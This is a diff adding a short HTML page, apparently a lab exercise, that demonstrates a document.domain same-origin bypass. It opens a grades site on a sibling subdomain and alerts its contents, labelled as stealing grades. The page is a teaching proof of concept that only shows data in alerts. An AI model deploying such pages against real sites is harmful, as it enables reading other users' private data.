@@ -1,0 +1,14 @@
+<html>
+<body>
+
+<h4>This page secretly set document.domin="cybersecurity.seu.edu" to read content in "grade.cybersecurity.seu.edu" </h4>
+<script type="text/javascript">
+
+	var w=window.open('http://grade.cybersecurity.seu.edu');
+	window.alert("This page steal the grades");
+	window.alert(w.document.body.innerHTML);
+	document.domain='cybersecurity.seu.edu';
+</script>
+
+</body>
+</html>
